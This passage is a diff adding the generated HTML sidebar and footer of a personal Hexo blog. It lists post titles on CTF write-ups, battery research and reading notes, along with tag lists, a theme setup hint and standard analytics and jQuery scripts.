+            <span class="archive-post-date">02/24</span><a class="archive-post-title" href= "/2020/02/24/i%E6%98%A5%E7%A7%8B%E6%96%B0%E6%98%A5%E8%B5%9Bpwn%E8%84%9A%E6%9C%AC/" >i春秋新春赛pwn脚本</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">02/24</span><a class="archive-post-title" href= "/2020/02/24/i%E6%98%A5%E7%A7%8B%E6%96%B0%E6%98%A5%E8%B5%9BCrypto%E8%AE%B0%E5%BD%95/" >i春秋新春赛Crypto记录</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">02/22</span><a class="archive-post-title" href= "/2020/02/22/hgame2020%20%E4%BA%8C%E5%8F%91%E5%85%A5%E9%AD%82%20%E5%8F%8Amt_rand()%E5%87%BD%E6%95%B0%E7%9A%84%E8%AE%B0%E5%BD%95/" >hgame2020 二发入魂 及mt_rand()函数的记录</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">02/21</span><a class="archive-post-title" href= "/2020/02/21/HGAME-MISC(WEEK%20ONE)%20Writes%20up/" >HGAME-MISC(WEEK ONE) Writes up</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">02/19</span><a class="archive-post-title" href= "/2020/02/19/hgame2020%20%E6%9D%82%E8%AE%B0%E5%BD%95-1/" >hgame2020 杂记录-1</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">02/16</span><a class="archive-post-title" href= "/2020/02/16/HGAME-WEB%20Writes%20up/" >HGAME-WEB Writes up</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">02/14</span><a class="archive-post-title" href= "/2020/02/14/%E5%85%B3%E4%BA%8E%E9%95%BF%E6%99%B6%E4%BD%93%E7%9A%84%E4%B8%80%E4%BA%9B%E8%AE%B0%E5%BD%95/" >关于长晶体的一些记录</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">02/13</span><a class="archive-post-title" href= "/2020/02/13/HGAME-CRYPTO%20Writes%20up/" >HGAME-CRYPTO Writes up</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/18</span><a class="archive-post-title" href= "/2020/01/18/Windows%E4%B8%8B%E5%AE%89%E8%A3%85sqlmap%EF%BC%8C%E4%BB%A5%E5%8F%8ADVWA%E6%90%AD%E5%BB%BA%E7%9A%84%E6%B3%A8%E6%84%8F%E4%BA%8B%E9%A1%B9/" >Windows下安装sqlmap，以及DVWA搭建的注意事项</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> 2019 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/24</span><a class="archive-post-title" href= "/2019/11/24/hello-world/" >Hello World</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> Invalid date </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">Invalid date</span><a class="archive-post-title" href= "/2019/11/26/hexo%20archer%E4%B8%BB%E9%A2%98%E6%97%A0%E6%B3%95%E6%98%BE%E7%A4%BA%E6%95%B0%E5%AD%A6%E5%85%AC%E5%BC%8F%E7%9A%84%E9%97%AE%E9%A2%98/" >hexo archer主题无法显示数学公式的问题</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> Invalid date </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">Invalid date</span><a class="archive-post-title" href= "/2020/03/09/i%E6%98%A5%E7%A7%8B%E6%96%B0%E6%98%A5%E8%B5%9Beasy_RSA/" >i春秋新春赛easy_RSA</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> Invalid date </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">Invalid date</span><a class="archive-post-title" href= "/2019/12/01/ubuntu18.04%E6%8D%A2%E6%BA%90%E9%97%AE%E9%A2%98/" >ubuntu18.04换源问题</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> Invalid date </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">Invalid date</span><a class="archive-post-title" href= "/2019/12/01/ubuntu%E8%BF%9B%E7%A8%8B%E9%97%AE%E9%A2%98/" >ubuntu进程问题</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> Invalid date </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">Invalid date</span><a class="archive-post-title" href= "/2020/02/13/%E3%80%8A%E5%8F%8D%E6%AC%BA%E9%AA%97%E7%9A%84%E8%89%BA%E6%9C%AF%E3%80%8B%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/" >《反欺骗的艺术》读书笔记</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> Invalid date </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">Invalid date</span><a class="archive-post-title" href= "/2020/02/12/%E3%80%90%E8%AE%B0%E5%BD%95%E3%80%91%E7%91%9E%E5%B9%B8%E7%9C%9F%E6%98%AF%E5%89%B2%E7%BE%8E%E5%9B%BD%E9%9F%AD%E8%8F%9C%EF%BC%8C%E8%A1%A5%E8%B4%B4%E4%B8%AD%E5%9B%BD%E4%BA%BA%E5%96%9D%E5%92%96%E5%95%A1%E5%90%97%EF%BC%9F/" >【记录】瑞幸真是割美国韭菜，补贴中国人喝咖啡吗？</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> 2019 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/10</span><a class="archive-post-title" href= "/2019/12/10/%E5%85%B3%E4%BA%8E%E9%92%A0%E7%A6%BB%E5%AD%90%E7%94%B5%E6%B1%A0%E7%9A%84%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/" >关于钠离子电池的学习记录</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/26</span><a class="archive-post-title" href= "/2019/11/26/%E5%85%B3%E4%BA%8E%E6%AF%95%E8%AE%BE%E7%9A%84%E4%B8%80%E7%82%B9%E8%AE%B0%E5%BD%95/" >关于毕设的一点记录</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/24</span><a class="archive-post-title" href= "/2019/11/24/%E7%AC%AC%E4%B8%80%E7%AF%87%E5%8D%9A%E6%96%87/" >第一篇博文</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> Invalid date </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">Invalid date</span><a class="archive-post-title" href= "/2020/04/11/%E8%82%96%E7%89%B9%E5%9F%BA%E5%8A%BF%E5%9E%92%E4%B8%8E%E6%AC%A7%E5%A7%86%E6%8E%A5%E8%A7%A6/" >肖特基势垒与欧姆接触</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> Invalid date </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">Invalid date</span><a class="archive-post-title" href= "/2020/03/09/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9B-MISC/" >高校战“疫”网络安全分享赛-MISC</a>
+        </li>
+    
+    </div>
+  </div>
+        <div class="sidebar-panel-tags">
+    <div class="sidebar-tags-name">
+    
+        <span class="sidebar-tag-name" data-tags="Crypto"><span class="iconfont-archer">&#xe606;</span>Crypto</span>
+    
+        <span class="sidebar-tag-name" data-tags="AWD"><span class="iconfont-archer">&#xe606;</span>AWD</span>
+    
+        <span class="sidebar-tag-name" data-tags="Misc"><span class="iconfont-archer">&#xe606;</span>Misc</span>
+    
+        <span class="sidebar-tag-name" data-tags="Re"><span class="iconfont-archer">&#xe606;</span>Re</span>
+    
+        <span class="sidebar-tag-name" data-tags="Web"><span class="iconfont-archer">&#xe606;</span>Web</span>
+    
+        <span class="sidebar-tag-name" data-tags="杂"><span class="iconfont-archer">&#xe606;</span>杂</span>
+    
+        <span class="sidebar-tag-name" data-tags="None"><span class="iconfont-archer">&#xe606;</span>None</span>
+    
+        <span class="sidebar-tag-name" data-tags="Pwn"><span class="iconfont-archer">&#xe606;</span>Pwn</span>
+    
+        <span class="sidebar-tag-name" data-tags="晶体"><span class="iconfont-archer">&#xe606;</span>晶体</span>
+    
+        <span class="sidebar-tag-name" data-tags="锂离子电池"><span class="iconfont-archer">&#xe606;</span>锂离子电池</span>
+    
+        <span class="sidebar-tag-name" data-tags="社工"><span class="iconfont-archer">&#xe606;</span>社工</span>
+    
+        <span class="sidebar-tag-name" data-tags="电池"><span class="iconfont-archer">&#xe606;</span>电池</span>
+    
+        <span class="sidebar-tag-name" data-tags="钙钛矿"><span class="iconfont-archer">&#xe606;</span>钙钛矿</span>
+    
+        <span class="sidebar-tag-name" data-tags="毕设"><span class="iconfont-archer">&#xe606;</span>毕设</span>
+    
+        <span class="sidebar-tag-name" data-tags="烹饪"><span class="iconfont-archer">&#xe606;</span>烹饪</span>
+    
+        <span class="sidebar-tag-name" data-tags="光电"><span class="iconfont-archer">&#xe606;</span>光电</span>
+    
+        <span class="sidebar-tag-name" data-tags="待定"><span class="iconfont-archer">&#xe606;</span>待定</span>
+    
+    </div>
+    <div class="iconfont-archer sidebar-tags-empty">&#xe678;</div>
+    <div class="tag-load-fail" style="display: none; color: #ccc; font-size: 0.6rem;">
+    缺失模块。<br/>
+    1、请确保node版本大于6.2<br/>
+    2、在博客根目录（注意不是archer根目录）执行以下命令：<br/>
+    <span style="color: #f75357; font-size: 1rem; line-height: 2rem;">npm i hexo-generator-json-content --save</span><br/>
+    3、在根目录_config.yml里添加配置：
+    <pre style="color: #787878; font-size: 0.6rem;">
+jsonContent:
+  meta: false
+  pages: false
+  posts:
+    title: true
+    date: true
+    path: true
+    text: false
+    raw: false
+    content: false
+    slug: false
+    updated: false
+    comments: false
+    link: false
+    permalink: false
+    excerpt: false
+    categories: true
+    tags: true</pre>
+    </div> 
+    <div class="sidebar-tags-list"></div>
+</div>
+        <div class="sidebar-panel-categories">
+    <div class="sidebar-categories-name">
+    
+        <span class="sidebar-category-name" data-categories="Uncategorized"><span class="iconfont-archer">&#xe60a;</span>Uncategorized</span>
+    
+    </div>
+    <div class="iconfont-archer sidebar-categories-empty">&#xe678;</div>
+    <div class="sidebar-categories-list"></div>
+</div>
+    </div>
+</div> 
+    <script>
+    var siteMeta = {
+        root: "/",
+        author: "DGZ"
+    }
+</script>
+    <!-- CDN failover -->
+    <script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script>
+    <script type="text/javascript">
+        if (typeof window.$ === 'undefined')
+        {
+            console.warn('jquery load from jsdelivr failed, will load local script')
+            document.write('<script src="/lib/jquery.min.js">\x3C/script>')
+        }
+    </script>
+    <script src="/scripts/main.js"></script>
+    <!-- algolia -->
+    
+    <!-- busuanzi  -->
+    
+    <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    
+    <!-- CNZZ  -->
+    
+    </div>
+    <!-- async load share.js -->
+    
+        <script src="/scripts/share.js" async></script>    
+     
+    </body>
+</html>
+
+
